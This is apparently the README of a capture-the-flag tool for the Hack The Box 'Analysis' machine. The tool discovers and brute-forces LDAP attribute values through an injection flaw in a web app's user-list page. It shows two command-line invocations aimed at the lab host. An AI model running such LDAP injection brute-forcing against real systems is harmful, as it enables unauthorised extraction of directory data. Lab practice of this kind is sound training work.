# ldap_disjection
Discover and BruteForce LDAP Fields From Vulnerable Web App.

This Tool has been created for [HTB Analysis Machine](https://app.hackthebox.com/machines/584)

Examples:

- Scan for valid fields
```
python3 ldap_disjection.py -m discover -u 'http://internal.analysis.htb/users/list.php' -ps 'name' -cn "CONTACT_" -G -s 0.2 -r '(<tr>.*</tr>)'
```

- BruteForce field value:
```
python3 ldap_disjection.py -m brutforce -u 'http://internal.analysis.htb/users/list.php' -ps 'name' -pv 'technician' -pb 'FIELD_NAME' -c technician -G -s '0.2' -l 2 -r '(<tr>.*</tr>)'
```